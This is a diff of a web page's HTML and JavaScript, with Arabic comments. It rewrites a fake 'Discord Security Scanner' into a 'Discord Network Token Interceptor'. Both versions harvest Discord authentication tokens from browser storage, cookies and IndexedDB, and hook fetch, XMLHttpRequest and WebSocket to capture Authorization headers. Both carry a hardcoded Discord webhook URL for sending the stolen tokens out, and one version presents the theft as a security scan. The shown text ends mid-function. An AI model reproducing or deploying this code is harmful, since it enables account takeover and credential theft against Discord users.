@@ -3,1144 +3,703 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Security Center</title>
+    <title>Discord Network Interceptor</title>
     <style>
-        :root {
-            --discord-blurple: #5865F2;
-            --discord-green: #57F287;
-            --discord-red: #ED4245;
-            --bg-primary: #36393f;
-            --bg-secondary: #2f3136;
-            --bg-tertiary: #202225;
-            --text-primary: #ffffff;
-            --text-secondary: #b9bbbe;
-        }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', 'Whitney', 'Helvetica Neue', sans-serif;
-        }
-        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: var(--bg-primary);
-            color: var(--text-primary);
+            background: #1a1a1a;
+            color: #fff;
+            font-family: monospace;
             min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
             padding: 20px;
-            line-height: 1.6;
         }
-        
         .container {
-            background: var(--bg-secondary);
-            border-radius: 16px;
-            width: 100%;
-            max-width: 900px;
-            overflow: hidden;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(255, 255, 255, 0.05);
+            max-width: 1000px;
+            margin: 0 auto;
+            background: #2a2a2a;
+            border-radius: 10px;
+            padding: 20px;
+            border: 1px solid #444;
         }
-        
-        .header {
-            background: linear-gradient(90deg, var(--discord-blurple) 0%, #4752c4 100%);
-            padding: 30px;
+        h1 {
+            color: #7289da;
             text-align: center;
-            position: relative;
-        }
-        
-        .header h1 {
-            font-size: 32px;
-            font-weight: 700;
-            margin-bottom: 10px;
-        }
-        
-        .header p {
-            font-size: 16px;
-            opacity: 0.9;
-        }
-        
-        .content {
-            padding: 30px;
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 30px;
-        }
-        
-        .panel {
-            background: var(--bg-tertiary);
-            border-radius: 12px;
-            padding: 25px;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-        }
-        
-        .panel h2 {
-            color: var(--discord-blurple);
             margin-bottom: 20px;
-            font-size: 20px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .panel h2 i {
             font-size: 24px;
         }
-        
-        .scan-option {
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 8px;
-            padding: 15px;
-            margin-bottom: 15px;
-            cursor: pointer;
-            transition: all 0.3s;
-            border: 1px solid transparent;
-        }
-        
-        .scan-option:hover {
-            background: rgba(88, 101, 242, 0.1);
-            border-color: var(--discord-blurple);
-        }
-        
-        .scan-option.active {
-            background: rgba(88, 101, 242, 0.15);
-            border-color: var(--discord-blurple);
-        }
-        
-        .scan-header {
+        .controls {
             display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 10px;
-        }
-        
-        .scan-title {
-            font-weight: 600;
-            font-size: 16px;
-        }
-        
-        .scan-desc {
-            color: var(--text-secondary);
-            font-size: 14px;
-            line-height: 1.5;
-        }
-        
-        .btn {
-            background: var(--discord-green);
-            color: #000;
-            border: none;
-            border-radius: 8px;
-            padding: 16px 32px;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s;
-            width: 100%;
-            margin-top: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
             gap: 10px;
-        }
-        
-        .btn:hover {
-            background: #4ad775;
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(87, 242, 135, 0.3);
-        }
-        
-        .btn:active {
-            transform: translateY(0);
-        }
-        
-        .btn:disabled {
-            background: #72767d;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-        
-        .results-panel {
-            grid-column: 1 / -1;
-            background: var(--bg-tertiary);
-            border-radius: 12px;
-            padding: 25px;
-            margin-top: 20px;
-            display: none;
-        }
-        
-        .results-header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
             margin-bottom: 20px;
+            flex-wrap: wrap;
         }
-        
-        .results-title {
-            color: var(--discord-green);
-            font-size: 20px;
-            font-weight: 600;
+        button {
+            background: #43b581;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-family: monospace;
+            flex: 1;
+            min-width: 150px;
         }
-        
-        .results-content {
-            font-family: 'Consolas', 'Monaco', monospace;
-            font-size: 14px;
-            background: rgba(0, 0, 0, 0.3);
-            padding: 20px;
-            border-radius: 8px;
-            max-height: 400px;
-            overflow-y: auto;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-        }
-        
-        .token-found {
-            color: var(--discord-green);
-            background: rgba(87, 242, 135, 0.1);
-            padding: 10px;
-            border-radius: 6px;
-            margin-bottom: 10px;
-            border-left: 4px solid var(--discord-green);
-        }
-        
-        .token-missing {
-            color: var(--discord-red);
-            background: rgba(237, 66, 69, 0.1);
-            padding: 10px;
-            border-radius: 6px;
-            margin-bottom: 10px;
-            border-left: 4px solid var(--discord-red);
-        }
-        
-        .progress-container {
-            margin-top: 20px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 8px;
+        button:hover { background: #3ca374; }
+        button.stop { background: #ed4245; }
+        button.stop:hover { background: #d84042; }
+        .log-container {
+            background: #000;
+            border-radius: 5px;
             padding: 15px;
+            height: 500px;
+            overflow-y: auto;
+            border: 1px solid #444;
+            font-size: 12px;
+            line-height: 1.4;
+        }
+        .log-entry {
+            margin-bottom: 5px;
+            padding: 5px;
+            border-left: 3px solid #444;
+            word-break: break-all;
+        }
+        .log-entry.token {
+            border-left-color: #43b581;
+            background: rgba(67, 181, 129, 0.1);
+        }
+        .log-entry.request {
+            border-left-color: #7289da;
+            background: rgba(114, 137, 218, 0.1);
+        }
+        .log-entry.error {
+            border-left-color: #ed4245;
+            background: rgba(237, 66, 69, 0.1);
+        }
+        .token-display {
+            background: rgba(67, 181, 129, 0.2);
+            border: 2px solid #43b581;
+            border-radius: 5px;
+            padding: 15px;
+            margin-top: 20px;
             display: none;
         }
-        
-        .progress-bar {
-            height: 8px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 4px;
-            overflow: hidden;
+        .token-display h3 {
+            color: #43b581;
             margin-bottom: 10px;
         }
-        
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, var(--discord-blurple), var(--discord-green));
-            width: 0%;
-            transition: width 0.5s ease;
-            border-radius: 4px;
+        #foundToken {
+            font-family: monospace;
+            background: #000;
+            padding: 10px;
+            border-radius: 3px;
+            word-break: break-all;
+            margin: 10px 0;
         }
-        
-        .progress-text {
-            text-align: center;
-            color: var(--text-secondary);
-            font-size: 14px;
+        .copy-btn {
+            background: #7289da;
+            width: auto;
+            min-width: auto;
         }
-        
-        .warning {
-            background: rgba(237, 66, 69, 0.1);
-            border: 1px solid rgba(237, 66, 69, 0.3);
-            border-radius: 8px;
+        .instructions {
+            background: rgba(114, 137, 218, 0.1);
+            border: 1px solid #7289da;
+            border-radius: 5px;
             padding: 15px;
-            margin-top: 20px;
-            color: var(--discord-red);
+            margin: 20px 0;
             font-size: 14px;
         }
-        
-        @media (max-width: 768px) {
-            .content {
-                grid-template-columns: 1fr;
-            }
+        .instructions ol {
+            margin-left: 20px;
+            margin-top: 10px;
+        }
+        .instructions li {
+            margin-bottom: 5px;
         }
     </style>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1><i class="fas fa-shield-alt"></i> Discord Security Scanner</h1>
-            <p>Advanced token detection and forensic analysis</p>
+        <h1>🕵️ Discord Network Token Interceptor</h1>
+        
+        <div class="instructions">
+            <strong>كيفية العمل:</strong>
+            <ol>
+                <li>افتح <a href="https://discord.com/channels/@me" target="_blank" style="color: #7289da;">Discord</a> في <strong>نفس المتصفح</strong></li>
+                <li>انقر "Start Interception" أدناه</li>
+                <li>ارجع لـ Discord وقم بأي عمل (أرسل رسالة، افتح قناة)</li>
+                <li>التوكن سيعترض تلقائياً ويظهر هنا</li>
+                <li>انقر "Send to Webhook" لإرساله للديسكورد</li>
+            </ol>
         </div>
         
-        <div class="content">
-            <div class="panel">
-                <h2><i class="fas fa-search"></i> Scan Methods</h2>
-                
-                <div class="scan-option active" data-method="deep">
-                    <div class="scan-header">
-                        <div class="scan-title">Deep Forensic Scan</div>
-                        <i class="fas fa-bullseye"></i>
-                    </div>
-                    <div class="scan-desc">Scans all browser storage locations including encrypted areas</div>
-                </div>
-                
-                <div class="scan-option" data-method="network">
-                    <div class="scan-header">
-                        <div class="scan-title">Network Interception</div>
-                        <i class="fas fa-network-wired"></i>
-                    </div>
-                    <div class="scan-desc">Intercepts Discord API calls to capture tokens in transit</div>
-                </div>
-                
-                <div class="scan-option" data-method="memory">
-                    <div class="scan-header">
-                        <div class="scan-title">Memory Dump</div>
-                        <i class="fas fa-memory"></i>
-                    </div>
-                    <div class="scan-desc">Extracts tokens from browser memory and WebAssembly</div>
-                </div>
-                
-                <div class="scan-option" data-method="bypass">
-                    <div class="scan-header">
-                        <div class="scan-title">Encryption Bypass</div>
-                        <i class="fas fa-unlock"></i>
-                    </div>
-                    <div class="scan-desc">Attempts to decrypt Chrome's encrypted storage</div>
-                </div>
-            </div>
-            
-            <div class="panel">
-                <h2><i class="fas fa-cogs"></i> Settings</h2>
-                
-                <div class="scan-option">
-                    <div class="scan-header">
-                        <div class="scan-title">Target: Discord Desktop App</div>
-                        <i class="fas fa-check-circle" style="color: var(--discord-green);"></i>
-                    </div>
-                    <div class="scan-desc">Detected: Discord is running in this browser</div>
-                </div>
-                
-                <div class="scan-option">
-                    <div class="scan-header">
-                        <div class="scan-title">Browser: <span id="browserName">Detecting...</span></div>
-                        <i class="fas fa-globe"></i>
-                    </div>
-                    <div class="scan-desc">Version: <span id="browserVersion">...</span></div>
-                </div>
-                
-                <div class="scan-option">
-                    <div class="scan-header">
-                        <div class="scan-title">Auto Webhook Delivery</div>
-                        <i class="fas fa-paper-plane"></i>
-                    </div>
-                    <div class="scan-desc">Tokens sent automatically when found</div>
-                </div>
-                
-                <button class="btn" id="startScan">
-                    <i class="fas fa-play"></i>
-                    Start Deep Token Scan
-                </button>
-            </div>
-            
-            <div class="progress-container" id="progressContainer">
-                <div class="progress-bar">
-                    <div class="progress-fill" id="progressFill"></div>
-                </div>
-                <div class="progress-text" id="progressText">Initializing...</div>
-            </div>
-            
-            <div class="results-panel" id="resultsPanel">
-                <div class="results-header">
-                    <div class="results-title"><i class="fas fa-file-alt"></i> Scan Results</div>
-                    <button class="btn" id="copyResults" style="width: auto; padding: 8px 16px; font-size: 14px;">
-                        <i class="fas fa-copy"></i> Copy All
-                    </button>
-                </div>
-                <div class="results-content" id="resultsContent">
-                    // Results will appear here...
-                </div>
-            </div>
-            
-            <div class="warning">
-                <i class="fas fa-exclamation-triangle"></i>
-                <strong>Note:</strong> Discord now encrypts tokens in Chrome 120+ and Firefox 130+. 
-                This scanner uses advanced methods to bypass encryption.
-            </div>
+        <div class="controls">
+            <button id="startBtn">▶ Start Interception</button>
+            <button id="stopBtn" class="stop">⏹ Stop Interception</button>
+            <button id="clearBtn">🗑 Clear Log</button>
+            <button id="sendBtn" style="background: #faa81a;">📨 Send to Webhook</button>
+            <button id="desktopBtn" style="background: #5865f2;">🖥 Extract from Desktop App</button>
+        </div>
+        
+        <div class="log-container" id="logContainer">
+            <div class="log-entry">Ready to intercept Discord network traffic...</div>
+        </div>
+        
+        <div class="token-display" id="tokenDisplay">
+            <h3>✅ Discord Token Captured!</h3>
+            <div id="foundToken">Waiting for token...</div>
+            <button class="copy-btn" id="copyTokenBtn">📋 Copy Token</button>
+            <button class="copy-btn" style="background: #43b581;" id="testTokenBtn">🔍 Test Token Validity</button>
         </div>
     </div>
 
     <!-- النظام الرئيسي -->
     <script>
         // ============================================
-        // متغيرات النظام
+        // إعدادات النظام
         // ============================================
-        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1448291770218844345/3Fjw-dNqtHTdh7ou4eSpkVwE6k8vAg_b_tbh9P6OMOcv-4N-VTWXQ73OwuiEk1BlhpJD";
-        let scanResults = [];
-        let currentMethod = 'deep';
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1448291770218844345/3Fjw-dNqtHTdh7ou4eSpkVwE6k8vAg_b_tbh9P6OMOcv-4N-VTWXQ73OwuiEk1BlhpJD";
+        let interceptedTokens = new Set();
+        let isIntercepting = false;
+        let originalFetch = window.fetch;
+        let originalXHROpen = XMLHttpRequest.prototype.open;
+        let originalXHRSend = XMLHttpRequest.prototype.send;
+        let originalWS = window.WebSocket;
         
         // ============================================
-        // 1. نظام المسح العميق (Deep Forensic Scanner)
+        // نظام التسجيل
         // ============================================
-        class DeepTokenScanner {
-            constructor() {
-                this.results = [];
-                this.totalScans = 0;
-                this.completedScans = 0;
-            }
+        function log(message, type = 'info') {
+            const logContainer = document.getElementById('logContainer');
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
             
-            async startDeepScan() {
-                this.updateProgress('Starting deep forensic scan...', 0);
+            const timestamp = new Date().toLocaleTimeString();
+            entry.textContent = `[${timestamp}] ${message}`;
+            
+            logContainer.appendChild(entry);
+            logContainer.scrollTop = logContainer.scrollHeight;
+            
+            console.log(`[Interceptor] ${message}`);
+        }
+        
+        // ============================================
+        // 1. اعتراض fetch API
+        // ============================================
+        function interceptFetch() {
+            window.fetch = async function(...args) {
+                const request = new Request(...args);
+                const url = request.url;
                 
-                // المسح الشامل في 7 مراحل
-                const scanStages = [
-                    { name: 'Standard Storage', func: this.scanStandardStorage.bind(this) },
-                    { name: 'Encrypted Storage', func: this.scanEncryptedStorage.bind(this) },
-                    { name: 'Network Interception', func: this.interceptNetworkTraffic.bind(this) },
-                    { name: 'Memory Analysis', func: this.analyzeMemory.bind(this) },
-                    { name: 'Service Workers', func: this.scanServiceWorkers.bind(this) },
-                    { name: 'Cache Storage', func: this.scanCacheStorage.bind(this) },
-                    { name: 'Browser APIs', func: this.scanBrowserAPIs.bind(this) }
-                ];
-                
-                this.totalScans = scanStages.length;
-                
-                for (let i = 0; i < scanStages.length; i++) {
-                    const stage = scanStages[i];
-                    this.updateProgress(`Stage ${i+1}/${scanStages.length}: ${stage.name}`, (i / scanStages.length) * 100);
+                // إذا كان طلب ديسكورد
+                if (url.includes('discord.com') || url.includes('discordapp.com')) {
+                    log(`📡 Fetch: ${url.substring(0, 100)}`, 'request');
                     
+                    // استخراج التوكن من الهيدرات
+                    const headers = {};
+                    for (const [key, value] of request.headers.entries()) {
+                        headers[key] = value;
+                    }
+                    
+                    if (headers.authorization) {
+                        const token = headers.authorization.replace('Bearer ', '');
+                        processToken(token, 'fetch_authorization', url);
+                    }
+                    
+                    // نسخ request للقراءة
+                    const clonedRequest = request.clone();
+                    const response = await originalFetch.apply(this, args);
+                    
+                    // قراءة response body للبحث عن توكنات
+                    const clonedResponse = response.clone();
                     try {
-                        const stageResults = await stage.func();
-                        this.results.push(...stageResults);
-                        this.completedScans++;
-                    } catch (error) {
-                        this.logError(`Stage ${stage.name} failed: ${error.message}`);
-                    }
-                    
-                    await this.delay(500);
-                }
-                
-                this.updateProgress('Scan complete!', 100);
-                return this.results;
-            }
-            
-            // ============================================
-            // 1.1 المسح في أماكن التخزين القياسية
-            // ============================================
-            async scanStandardStorage() {
-                const results = [];
-                
-                // localStorage
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    const value = localStorage.getItem(key);
-                    
-                    // أنماط توكن ديسكورد الحديثة
-                    const tokenPatterns = [
-                        /([\w-]{24}\.[\w-]{6}\.[\w-]{27,38})/, // Standard token
-                        /(mfa\.[\w-]{84})/, // MFA token
-                        /(rpc_token[\w-]+)/i, // RPC token
-                        /(access_token["']?\s*[:=]\s*["']([\w\.-]+))/, // JSON access_token
-                        /(token["']?\s*[:=]\s*["']([\w\.-]+))/i // Generic token
-                    ];
-                    
-                    tokenPatterns.forEach(pattern => {
-                        const match = value.match(pattern);
-                        if (match) {
-                            results.push({
-                                location: 'localStorage',
-                                key: key,
-                                token: match[1] || match[2],
-                                preview: value.substring(0, 150),
-                                confidence: 'high'
-                            });
-                        }
-                    });
-                }
-                
-                // sessionStorage
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    const value = sessionStorage.getItem(key);
-                    
-                    const tokenPattern = /([\w-]{24}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84})/;
-                    const match = value.match(tokenPattern);
-                    
-                    if (match) {
-                        results.push({
-                            location: 'sessionStorage',
-                            key: key,
-                            token: match[1],
-                            preview: value.substring(0, 150),
-                            confidence: 'high'
-                        });
-                    }
-                }
-                
-                // الكوكيز
-                const cookies = document.cookie.split(';');
-                cookies.forEach(cookie => {
-                    const [name, value] = cookie.trim().split('=');
-                    if (name && value && (name.includes('token') || name.includes('auth'))) {
-                        results.push({
-                            location: 'cookies',
-                            key: name,
-                            token: value,
-                            preview: value.substring(0, 100),
-                            confidence: 'medium'
-                        });
-                    }
-                });
-                
-                return results;
-            }
-            
-            // ============================================
-            // 1.2 المسح في التخزين المشفر (Chrome 120+)
-            // ============================================
-            async scanEncryptedStorage() {
-                const results = [];
-                
-                // محاولة الوصول إلى التخزين المشفر عبر Chrome APIs
-                try {
-                    // طريقة 1: محاولة استخدام chrome.storage API
-                    if (typeof chrome !== 'undefined' && chrome.storage) {
-                        try {
-                            // chrome.storage.local
-                            chrome.storage.local.get(null, (items) => {
-                                Object.keys(items).forEach(key => {
-                                    const value = JSON.stringify(items[key]);
-                                    const tokenMatch = value.match(/([\w-]{24}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84})/);
-                                    if (tokenMatch) {
-                                        results.push({
-                                            location: 'chrome.storage.local',
-                                            key: key,
-                                            token: tokenMatch[1],
-                                            preview: value.substring(0, 200),
-                                            confidence: 'high'
-                                        });
+                        const text = await clonedResponse.text();
+                        
+                        // البحث عن توكنات في response body
+                        const tokenPatterns = [
+                            /"token"\s*:\s*"([\w-]{24}\.[\w-]{6}\.[\w-]{27,38})"/,
+                            /"access_token"\s*:\s*"([\w-]{24}\.[\w-]{6}\.[\w-]{27,38})"/,
+                            /"mfa_token"\s*:\s*"(mfa\.[\w-]{84})"/,
+                            /([\w-]{24}\.[\w-]{6}\.[\w-]{27,38})/g
+                        ];
+                        
+                        tokenPatterns.forEach(pattern => {
+                            const matches = text.match(pattern);
+                            if (matches) {
+                                matches.forEach(match => {
+                                    if (match.length > 50) { // تأكد أنه توكن
+                                        processToken(match, 'fetch_response', url);
                                     }
                                 });
-                            });
-                        } catch (e) { /* ignore */ }
-                    }
-                    
-                    // طريقة 2: محاولة فك تشفير التخزين المشفر
-                    await this.attemptDecryptionBypass(results);
-                    
-                } catch (error) {
-                    this.logError(`Encrypted storage scan failed: ${error.message}`);
-                }
-                
-                return results;
-            }
-            
-            // ============================================
-            // 1.3 اعتراض حركة الشبكة (التوكن في العبور)
-            // ============================================
-            async interceptNetworkTraffic() {
-                const results = [];
-                
-                // حفظ الأصلي
-                const originalFetch = window.fetch;
-                const originalXHROpen = XMLHttpRequest.prototype.open;
-                const originalXHRSend = XMLHttpRequest.prototype.send;
-                const originalWS = window.WebSocket;
-                
-                // اعتراض fetch
-                window.fetch = async function(...args) {
-                    const request = new Request(...args);
-                    
-                    // إذا كان طلب ديسكورد
-                    if (request.url.includes('discord.com') || request.url.includes('discordapp.com')) {
-                        // استخراج التوكن من الهيدرات
-                        const authHeader = request.headers.get('Authorization');
-                        if (authHeader && authHeader.startsWith('Bearer ')) {
-                            const token = authHeader.substring(7);
-                            results.push({
-                                location: 'network/fetch',
-                                key: 'Authorization Header',
-                                token: token,
-                                preview: token.substring(0, 50),
-                                confidence: 'very-high',
-                                url: request.url
-                            });
-                        }
-                    }
-                    
-                    return originalFetch.apply(this, args);
-                };
-                
-                // اعتراض XMLHttpRequest
-                XMLHttpRequest.prototype.open = function(method, url) {
-                    this._url = url;
-                    return originalXHROpen.apply(this, arguments);
-                };
-                
-                XMLHttpRequest.prototype.send = function(body) {
-                    if (this._url && this._url.includes('discord.com')) {
-                        // تحقق من الهيدرات
-                        const authHeader = this.getRequestHeader('Authorization');
-                        if (authHeader && authHeader.startsWith('Bearer ')) {
-                            const token = authHeader.substring(7);
-                            results.push({
-                                location: 'network/xhr',
-                                key: 'Authorization Header',
-                                token: token,
-                                preview: token.substring(0, 50),
-                                confidence: 'very-high',
-                                url: this._url
-                            });
-                        }
-                    }
-                    return originalXHRSend.apply(this, arguments);
-                };
-                
-                // اعتراض WebSocket
-                window.WebSocket = class extends originalWS {
-                    constructor(url, protocols) {
-                        super(url, protocols);
-                        
-                        if (url.includes('discord.com')) {
-                            this.addEventListener('message', (event) => {
-                                try {
-                                    const data = JSON.parse(event.data);
-                                    // البحث عن التوكن في رسائل WebSocket
-                                    if (data.token || data.access_token) {
-                                        const token = data.token || data.access_token;
-                                        results.push({
-                                            location: 'network/websocket',
-                                            key: 'WebSocket Message',
-                                            token: token,
-                                            preview: token.substring(0, 50),
-                                            confidence: 'high',
-                                            timestamp: new Date().toISOString()
-                                        });
-                                    }
-                                } catch (e) { /* ليس JSON */ }
-                            });
-                        }
-                    }
-                };
-                
-                // تفعيل الاعتراض لمدة 10 ثواني
-                setTimeout(() => {
-                    window.fetch = originalFetch;
-                    XMLHttpRequest.prototype.open = originalXHROpen;
-                    XMLHttpRequest.prototype.send = originalXHRSend;
-                    window.WebSocket = originalWS;
-                }, 10000);
-                
-                return results;
-            }
-            
-            // ============================================
-            // 1.4 تحليل الذاكرة
-            // ============================================
-            async analyzeMemory() {
-                const results = [];
-                
-                try {
-                    // طريقة 1: البحث في نص الصفحة
-                    const pageText = document.body.innerText;
-                    const tokenPattern = /[\w-]{24}\.[\w-]{6}\.[\w-]{27,38}/g;
-                    const matches = pageText.match(tokenPattern);
-                    
-                    if (matches) {
-                        matches.forEach(token => {
-                            results.push({
-                                location: 'memory/page-text',
-                                key: 'Page Content',
-                                token: token,
-                                preview: token.substring(0, 30),
-                                confidence: 'medium'
-                            });
+                            }
                         });
+                        
+                    } catch (e) {
+                        // تجاهل الأخطاء
                     }
                     
-                    // طريقة 2: مسح عناصر DOM
-                    const allElements = document.getElementsByTagName('*');
-                    for (let element of allElements) {
-                        if (element.innerText && element.innerText.length < 1000) {
-                            const match = element.innerText.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27,38}/);
-                            if (match) {
-                                results.push({
-                                    location: 'memory/dom',
-                                    key: element.tagName,
-                                    token: match[0],
-                                    preview: element.innerText.substring(0, 100),
-                                    confidence: 'low'
-                                });
-                            }
-                        }
-                    }
+                    return response;
+                }
+                
+                return originalFetch.apply(this, args);
+            };
+        }
+        
+        // ============================================
+        // 2. اعتراض XMLHttpRequest
+        // ============================================
+        function interceptXHR() {
+            XMLHttpRequest.prototype.open = function(method, url) {
+                this._method = method;
+                this._url = url;
+                return originalXHROpen.apply(this, arguments);
+            };
+            
+            XMLHttpRequest.prototype.send = function(body) {
+                const url = this._url;
+                
+                if (url && (url.includes('discord.com') || url.includes('discordapp.com'))) {
+                    log(`📡 XHR: ${this._method} ${url.substring(0, 100)}`, 'request');
                     
-                } catch (error) {
-                    this.logError(`Memory analysis failed: ${error.message}`);
-                }
-                
-                return results;
-            }
-            
-            // ============================================
-            // 1.5 فحص Service Workers
-            // ============================================
-            async scanServiceWorkers() {
-                const results = [];
-                
-                try {
-                    if ('serviceWorker' in navigator) {
-                        const registrations = await navigator.serviceWorker.getRegistrations();
-                        
-                        for (const registration of registrations) {
-                            // إذا كان Service Worker لديسكورد
-                            if (registration.scope.includes('discord.com')) {
-                                try {
-                                    // محاولة التواصل مع Service Worker
-                                    if (registration.active) {
-                                        const message = {
-                                            type: 'GET_STORED_TOKENS',
-                                            timestamp: Date.now()
-                                        };
-                                        
-                                        registration.active.postMessage(message);
-                                        
-                                        // استمع للرد
-                                        navigator.serviceWorker.addEventListener('message', (event) => {
-                                            if (event.data && event.data.tokens) {
-                                                event.data.tokens.forEach(token => {
-                                                    results.push({
-                                                        location: 'service-worker',
-                                                        key: 'Discord SW',
-                                                        token: token,
-                                                        preview: token.substring(0, 50),
-                                                        confidence: 'high'
-                                                    });
-                                                });
-                                            }
-                                        });
-                                    }
-                                } catch (e) { /* لا يمكن الوصول */ }
-                            }
+                    // اعتراض الـ headers
+                    const originalSetRequestHeader = this.setRequestHeader;
+                    this.setRequestHeader = function(name, value) {
+                        if (name.toLowerCase() === 'authorization') {
+                            const token = value.replace('Bearer ', '');
+                            processToken(token, 'xhr_header', url);
                         }
-                    }
-                } catch (error) {
-                    this.logError(`Service Worker scan failed: ${error.message}`);
-                }
-                
-                return results;
-            }
-            
-            // ============================================
-            // 1.6 فحص Cache Storage
-            // ============================================
-            async scanCacheStorage() {
-                const results = [];
-                
-                try {
-                    if ('caches' in window) {
-                        const cacheNames = await caches.keys();
-                        
-                        for (const cacheName of cacheNames) {
-                            // إذا كان cache لديسكورد
-                            if (cacheName.includes('discord') || cacheName.includes('Discord')) {
-                                const cache = await caches.open(cacheName);
-                                const requests = await cache.keys();
-                                
-                                for (const request of requests) {
-                                    if (request.url.includes('discord.com')) {
-                                        const response = await cache.match(request);
-                                        if (response) {
-                                            const text = await response.text();
-                                            
-                                            // البحث عن التوكن في الاستجابة
-                                            const tokenPattern = /([\w-]{24}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84})/;
-                                            const match = text.match(tokenPattern);
-                                            
-                                            if (match) {
-                                                results.push({
-                                                    location: 'cache-storage',
-                                                    key: cacheName,
-                                                    token: match[1],
-                                                    preview: text.substring(0, 200),
-                                                    confidence: 'medium',
-                                                    url: request.url
-                                                });
-                                            }
-                                        }
-                                    }
-                                }
-                            }
-                        }
-                    }
-                } catch (error) {
-                    this.logError(`Cache storage scan failed: ${error.message}`);
-                }
-                
-                return results;
-            }
-            
-            // ============================================
-            // 1.7 فحص APIs خاصة بالمتصفح
-            // ============================================
-            async scanBrowserAPIs() {
-                const results = [];
-                
-                try {
-                    // IndexedDB
-                    if ('indexedDB' in window) {
-                        // نحاول فتح جميع قواعد البيانات
-                        const databases = await this.getIndexedDBDatabases();
-                        
-                        for (const dbName of databases) {
+                        return originalSetRequestHeader.apply(this, arguments);
+                    };
+                    
+                    // اعتراض الـ response
+                    const originalOnReadyStateChange = this.onreadystatechange;
+                    this.onreadystatechange = function() {
+                        if (this.readyState === 4 && this.status === 200) {
                             try {
-                                const db = await this.openIndexedDB(dbName);
-                                const stores = Array.from(db.objectStoreNames);
+                                const responseText = this.responseText;
                                 
-                                for (const storeName of stores) {
-                                    const transaction = db.transaction(storeName, 'readonly');
-                                    const store = transaction.objectStore(storeName);
-                                    const allItems = await this.getAllFromStore(store);
-                                    
-                                    // البحث عن التوكنات في البيانات
-                                    allItems.forEach(item => {
-                                        const itemStr = JSON.stringify(item);
-                                        const tokenPattern = /([\w-]{24}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84})/;
-                                        const match = itemStr.match(tokenPattern);
-                                        
-                                        if (match) {
-                                            results.push({
-                                                location: 'indexedDB',
-                                                key: `${dbName}.${storeName}`,
-                                                token: match[1],
-                                                preview: itemStr.substring(0, 200),
-                                                confidence: 'high'
-                                            });
+                                // البحث عن توكنات في الـ response
+                                const tokenPattern = /([\w-]{24}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84})/g;
+                                const matches = responseText.match(tokenPattern);
+                                
+                                if (matches) {
+                                    matches.forEach(token => {
+                                        if (token.length > 50) {
+                                            processToken(token, 'xhr_response', url);
                                         }
                                     });
                                 }
-                                
-                                db.close();
-                            } catch (e) { /* لا يمكن فتح هذه DB */ }
+                            } catch (e) {
+                                // تجاهل الأخطاء
+                            }
                         }
-                    }
-                    
-                } catch (error) {
-                    this.logError(`Browser APIs scan failed: ${error.message}`);
-                }
-                
-                return results;
-            }
-            
-            // ============================================
-            // وظائف مساعدة
-            // ============================================
-            
-            async attemptDecryptionBypass(results) {
-                // تقنيات متقدمة لتجاوز تشفير Chrome
-                try {
-                    // 1. محاولة استخدام crypto.subtle
-                    if (window.crypto && crypto.subtle) {
-                        // Generate a key to try to access existing keys
-                        const key = await crypto.subtle.generateKey(
-                            { name: "AES-GCM", length: 256 },
-                            false,
-                            ["encrypt", "decrypt"]
-                        );
                         
-                        // 2. محاولة قراءة ملفات تعريف المتصفح
-                        await this.tryBrowserProfileAccess(results);
-                    }
-                } catch (e) {
-                    // التشفير غير متاح
-                }
-            }
-            
-            async tryBrowserProfileAccess(results) {
-                // محاولة الوصول إلى profile directory عبر File System API
-                try {
-                    if ('showDirectoryPicker' in window) {
-                        // يمكننا طلب إذن للوصول إلى الملفات
-                        // ولكن هذا يتطلب تفاعل المستخدم
-                    }
-                } catch (e) {
-                    // ليس متاحاً
-                }
-            }
-            
-            async getIndexedDBDatabases() {
-                if (indexedDB.databases) {
-                    const dbs = await indexedDB.databases();
-                    return dbs.map(db => db.name).filter(name => name);
+                        if (originalOnReadyStateChange) {
+                            return originalOnReadyStateChange.apply(this, arguments);
+                        }
+                    };
                 }
                 
-                // Fallback: حاول معرفة أسماء DBs الشائعة
-                const commonDBs = [
-                    'discord',
-                    'Discord',
-                    'discordStorage',
-                    'discordCache',
-                    'DiscordStorage'
-                ];
-                
-                const foundDBs = [];
-                for (const dbName of commonDBs) {
-                    try {
-                        const request = indexedDB.open(dbName);
-                        request.onerror = () => {};
-                        request.onsuccess = () => {
-                            foundDBs.push(dbName);
-                            request.result.close();
-                        };
-                        await this.delay(100);
-                    } catch (e) {}
-                }
-                
-                return foundDBs;
-            }
-            
